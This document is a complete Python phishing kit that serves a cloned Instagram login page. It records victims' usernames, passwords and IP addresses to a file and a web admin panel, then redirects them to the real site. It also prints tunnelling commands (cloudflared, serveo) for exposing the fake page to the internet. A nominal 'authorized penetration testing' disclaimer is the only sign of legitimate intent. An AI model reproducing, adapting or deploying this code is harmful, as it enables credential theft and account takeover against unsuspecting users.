#!/usr/bin/env python3
# ABHACKER-Phish-Engine.py
# Author: ABHACKER | IG Security Testing Tool
# Authorized Penetration Testing Only

import os
import sys
import json
import time
import random
import socket
import threading
import hashlib
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import parse_qs, urlparse

# ========== ABHACKER BANNER ==========
BANNER = """
\033[1;31m
████████████████████████████████████████████████████
█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
█░░  █████╗ ██████╗ ██╗  ██╗ █████╗  ██████╗██╗  ██╗ ██
█░░ ██╔══██╗██╔══██╗██║  ██║██╔══██╗██╔════╝██║ ██╔╝ ██
█░░ ███████║██████╔╝███████║███████║██║     █████╔╝  ██
█░░ ██╔══██║██╔══██╗██╔══██║██╔══██║██║     ██╔═██╗  ██
█░░ ██║  ██║██████╔╝██║  ██║██║  ██║╚██████╗██║  ██╗ ██
█░░ ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝ ██
█░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░█
████████████████████████████████████████████████████
\033[0m
\033[1;33m
════════════════════════════════════════════════════
    IG SECURITY TESTING FRAMEWORK v2.0
    Author : ABHACKER
    ⚠ Authorized Penetration Testing Only ⚠
════════════════════════════════════════════════════
\033[0m
"""

# ========== LOGIN PAGE HTML ==========
LOGIN_PAGE = """<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #fafafa;
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; margin: 0;
        }
        .container {
            background: #fff;
            border: 1px solid #dbdbdb;
            border-radius: 1px;
            padding: 40px;
            max-width: 350px; width: 100%;
            text-align: center;
        }
        .logo {
            font-family: 'Billabong', sans-serif;
            font-size: 48px; margin-bottom: 20px;
            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
        }
        input {
            width: 100%; padding: 12px 8px; margin: 4px 0;
            border: 1px solid #dbdbdb; border-radius: 3px;
            background: #fafafa; font-size: 14px;
            outline: none;
        }
        input:focus { border-color: #a8a8a8; }
        .btn {
            width: 100%; padding: 8px; margin-top: 12px;
            background: #0095f6; border: none; border-radius: 8px;
            color: #fff; font-size: 14px; font-weight: 600;
            cursor: pointer; opacity: 0.7;
        }
        .btn:hover { opacity: 1; }
        .error { color: #ed4956; font-size: 12px; margin: 8px 0; display: none; }
        .footer { margin-top: 16px; font-size: 12px; color: #8e8e8e; }
        .footer a { color: #00376b; text-decoration: none; font-weight: 600; }
        .divider { display: flex; margin: 16px 0; }
        .divider div { flex: 1; }
        .divider span { color: #8e8e8e; font-size: 13px; font-weight: 600; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">Instagram</div>
        <div class="error" id="error">Sorry, your password was incorrect.</div>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Phone number, username, or email" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit" class="btn" id="loginBtn">Log in</button>
        </form>
        <div class="divider"><div><hr></div><span>OR</span><div><hr></div></div>
        <div class="footer">
            <a href="#">Forgot password?</a><br><br>
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>
</body>
</html>"""

# ========== SUCCESS PAGE ==========
SUCCESS_PAGE = """<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
    body { font-family: Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .card { background: #fff; border: 1px solid #dbdbdb; border-radius: 12px; padding: 40px; text-align: center; max-width: 400px; }
    .check { color: #2ecc71; font-size: 64px; }
    h2 { color: #262626; margin: 16px 0; }
    p { color: #8e8e8e; font-size: 14px; }
</style>
</head>
<body>
<div class="card">
    <div class="check">&#10004;</div>
    <h2>Login Successful</h2>
    <p>You have been verified. Redirecting to Instagram...</p>
</div>
<script>setTimeout(function() { window.location = 'https://www.instagram.com'; }, 2000);</script>
</body>
</html>"""

# ========== CREDENTIALS STORAGE ==========
CRED_FILE = "ABHACKER_captured.txt"
LOG_FILE = "ABHACKER_log.txt"
VICTIMS = []

class RequestHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # Suppress default logs
    
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Server', 'Instagram')
            self.end_headers()
            self.wfile.write(LOGIN_PAGE.encode())
            
        elif self.path == '/admin' or self.path == '/ABHACKER':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.show_admin()
            
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Not Found')
    
    def do_POST(self):
        if self.path == '/login':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode()
            params = parse_qs(post_data)
            
            username = params.get('username', [''])[0]
            password = params.get('password', [''])[0]
            
            timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
            ip = self.client_address[0]
            
            # Save credentials
            with open(CRED_FILE, 'a') as f:
                f.write(f"[{timestamp}] IP: {ip} | User: {username} | Pass: {password}\n")
            
            log_entry = {
                'timestamp': timestamp,
                'ip': ip,
                'username': username,
                'password': password
            }
            VICTIMS.append(log_entry)
            
            # Show on terminal
            os.system('clear')
            print(BANNER)
            print(f"\033[1;32m[+] CREDENTIALS CAPTURED!\033[0m")
            print(f"\033[1;33m[+] Time: {timestamp}\033[0m")
            print(f"\033[1;33m[+] IP: {ip}\033[0m")
            print(f"\033[1;31m[+] Username: {username}\033[0m")
            print(f"\033[1;31m[+] Password: {password}\033[0m")
            print(f"\033[1;32m[+] Saved to: {CRED_FILE}\033[0m")
            print("\n" + "="*50)
            
            # Return success page
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(SUCCESS_PAGE.encode())
    
    def show_admin(self):
        html = f"""<!DOCTYPE html>
<html><head><title>ABHACKER Panel</title>
<style>
    body {{ font-family: monospace; background: #0a0a0a; color: #00ff00; padding: 20px; }}
    h1 {{ color: #ff0000; text-align: center; }}
    .cred {{ background: #1a1a1a; border: 1px solid #333; padding: 10px; margin: 5px 0; border-radius: 5px; }}
    .ip {{ color: #888; }}
    table {{ width: 100%; border-collapse: collapse; }}
    th {{ background: #333; color: #ff0; padding: 10px; }}
    td {{ padding: 8px; border-bottom: 1px solid #333; }}
</style></head><body>
<h1>🔱 ABHACKER PHISH PANEL</h1>
<p>Total Captured: {len(VICTIMS)}</p>
<table>
<tr><th>Time</th><th>IP</th><th>Username</th><th>Password</th></tr>"""
        
        for v in VICTIMS:
            html += f"<tr><td>{v['timestamp']}</td><td>{v['ip']}</td><td>{v['username']}</td><td>{v['password']}</td></tr>"
        
        html += """</table>
<p style="margin-top:20px;color:#888;">[+] Refresh to update | Author: ABHACKER</p>
</body></html>"""
        
        self.wfile.write(html.encode())

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def start_ngrok():
    print("\033[1;33m[+] Starting tunnel...\033[0m")
    # Try cloudflared first
    os.system("pkg install cloudflared -y 2>/dev/null || true")
    print("\033[1;32m[!] Use one of these in another terminal:\033[0m")
    print("\033[1;36m    cloudflared tunnel --url http://localhost:8080\033[0m")
    print("\033[1;36m    OR\033[0m")
    print("\033[1;36m    ssh -R 80:localhost:8080 serveo.net\033[0m")

def main():
    os.system('clear')
    print(BANNER)
    print("\033[1;34m")
    print("  [1] Start Server (Port 8080)")
    print("  [2] Start Server (Custom Port)")
    print("  [3] View Captured Credentials")
    print("  [4] Clear All Logs")
    print("  [5] Exit")
    print("\033[0m")
    
    choice = input("\033[1;33m[?] Select option: \033[0m")
    
    if choice == '1':
        port = 8080
    elif choice == '2':
        port = int(input("\033[1;33m[?] Enter port: \033[0m"))
    elif choice == '3':
        try:
            with open(CRED_FILE, 'r') as f:
                print(f.read())
        except:
            print("\033[1;31m[!] No credentials captured yet.\033[0m")
        input("\nPress Enter to continue...")
        return main()
    elif choice == '4':
        open(CRED_FILE, 'w').close()
        print("\033[1;32m[+] Logs cleared.\033[0m")
        input("Press Enter...")
        return main()
    elif choice == '5':
        sys.exit(0)
    
    local_ip = get_local_ip()
    
    print(f"\n\033[1;32m[+] Server starting on http://{local_ip}:{port}\033[0m")
    print(f"\033[1;32m[+] Capture log: {CRED_FILE}\033[0m")
    print(f"\033[1;32m[+] Admin panel: http://{local_ip}:{port}/ABHACKER\033[0m")
    print(f"\033[1;33m[!] Share this URL for testing:\033[0m")
    print(f"\033[1;36m    http://{local_ip}:{port}\033[0m")
    
    # Start ngrok suggestion
    start_ngrok()
    
    print("\n\033[1;31m[!] Waiting for targets... (Ctrl+C to stop)\033[0m\n")
    
    try:
        server = HTTPServer(('0.0.0.0', port), RequestHandler)
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n\033[1;33m[!] Server stopped.\033[0m")
        print(f"\033[1;33m[!] Credentials saved in: {CRED_FILE}\033[0m")
        server.server_close()

if __name__ == '__main__':
    main()